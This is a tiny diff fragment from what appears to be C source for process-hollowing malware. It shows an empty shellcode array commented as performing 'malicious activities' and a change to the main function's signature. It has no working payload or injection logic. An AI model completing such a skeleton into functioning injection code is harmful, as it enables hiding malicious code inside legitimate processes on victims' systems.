@@ -5,7 +5,7 @@ unsigned char shellcode[] = {
     /* This shellcode will be executed in the hollowed process and will perform the malicious activities */
 };
 
-int _tmain(int argc, _TCHAR* argv[])
+int _tmain()
 {
     /* The main function will perform the process hollowing */
     STARTUPINFO si = { 0 };
